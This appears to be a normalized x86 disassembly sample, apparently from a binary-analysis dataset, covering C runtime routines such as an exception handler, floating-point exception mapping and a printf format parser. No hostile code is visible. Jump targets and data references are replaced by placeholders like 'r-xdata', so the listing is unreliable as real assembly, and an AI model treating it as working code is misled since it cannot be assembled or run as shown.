call sub_420d2c
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_420fdd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4208cf
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420e2f
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4209b6
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420ef0
jmp r-xdata
sub_421065
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420fdd
add esp 0x1c
pop ebp
retn
sub_421088
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_4210ab
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_4299b8
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_41ef83
sub_4210d3
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41e7f9
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_421220
push sub_421280
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_421280
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_41ac09
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_41ac09
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_42743b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_4273f2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_41ac09
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_41ac09
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_427422
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_42743b
mov eax [ ebp + 0xc ]
push r--data
call sub_4279d0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_41ac09
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_427409
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_41ac09
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_42140f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
pop ebp
retn
sub_421442
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_429a17
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_421471
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_41c34a
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_41c34a
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
mov eax edi
dec ebx
call sub_421442
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
call sub_41c34a
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_41c34a
cmp [ eax ] 0x2a
jne r-xdata
call sub_41c34a
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
push 0x3f
mov eax edi
call sub_421442
pop ecx
sub_4214ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_41b9dc
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x44c ] bl
movzx edx [ esi ]
xor ecx ecx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x420 ] edx
cmp dx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax dx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x420 ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_42208e ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x45c ] eax
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x45c ]
mov edi [ ebp - 0x41c ]
mov edx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax dx
sub eax 0x20
je r-xdata
cmp dx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp dx 0x2a
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push edx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_421442
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x420 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x444 ] ecx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea edi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x41c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x41c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x408 ] 0x20
add edx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x420 ] edx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_41a7eb
and [ ebp - 0x43c ] 0x0
mov ebx [ ebp - 0x430 ]
sub ebx [ ebp - 0x414 ]
sub ebx [ ebp - 0x428 ]
test [ ebp - 0x408 ] 0xc
mov [ ebp - 0x470 ] ebx
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x424 ]
mov ecx [ ebp - 0x428 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_421471
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp dx 0x67
jne r-xdata
mov eax [ ebp - 0x41c ]
mov ecx [ eax ]
add eax 0x8
mov esi [ DecodePointer@IAT ]
mov [ ebp - 0x41c ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x460 ]
movsx eax dl
push [ ebp - 0x40c ]
mov [ ebp - 0x46c ] ecx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x41c ] edi
call sub_428646
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_4287ce
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_421442
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x434 ] ax
mov [ ebp - 0x428 ] 0x1
mov ebx 0xa3
cmp [ ebp - 0x40c ] ebx
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_429b9e
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x45c ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x410 ]
mov edi [ ebp - 0x424 ]
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x418 ]
call sub_421471
pop ecx
cmp [ ebp - 0x414 ] 0x0
jle r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test edi edi
jg r-xdata
push 0x20
mov edx [ ebp - 0x420 ]
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_41c229
mov edx [ ebp - 0x420 ]
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov ebx [ ebp - 0x414 ]
mov eax [ ebp - 0x424 ]
push 0x30
lea esi [ ebp - 0x418 ]
dec edi
call sub_421442
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
mov [ ebp - 0x40c ] ebx
jmp r-xdata
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc edi
mov [ ebp - 0x410 ] edi
lea eax [ ebp - 0x458 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x420 ]
cdq
push edx
push eax
push ebx
push edi
call sub_427060
add ecx 0x30
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov edi [ ebp - 0x470 ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_421442
add edi [ ebp - 0x420 ]
pop ecx
test ebx ebx
jg r-xdata
test edi edi
jg r-xdata
call sub_41d120
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
dec ebx
call sub_429b9e
add esp 0x10
mov [ ebp - 0x420 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_421442
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_4220ae
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x428 ] eax
call sub_41b9dc
test esi esi
jne r-xdata
xor eax eax
cmp ebx eax
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x440 ] 0x0
je r-xdata
movzx ecx [ ebx ]
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x43c ] eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x420 ] ecx
cmp cx ax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
push 0x2
pop esi
add ebx esi
xor eax eax
mov [ ebp - 0x45c ] ebx
cmp [ ebp - 0x41c ] eax
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
mov eax [ ebp - 0x41c ]
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x43c ] 0x0
je r-xdata
lea edx [ ecx - 0x20 ]
cmp dx 0x58
ja r-xdata
cmp [ ebp - 0x43c ] 0x7
jne r-xdata
mov edx [ ebp - 0x43c ]
imul eax eax 0x9
movzx eax [ eax + edx + r--data ]
push 0x8
shr eax 0x4
pop edx
mov [ ebp - 0x43c ] eax
cmp eax edx
je r-xdata
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
cmp eax 0x7
ja r-xdata
mov ebx [ ebp - 0x45c ]
mov edi [ ebp - 0x418 ]
jmp [ eax * 4 + jump_table_422c42 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x42c ]
push ecx
lea esi [ ebp - 0x41c ]
mov [ ebp - 0x428 ] 0x1
call sub_421442
pop ecx
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x420 ] eax
test ax ax
je r-xdata
or [ ebp - 0x408 ] esi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x430 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
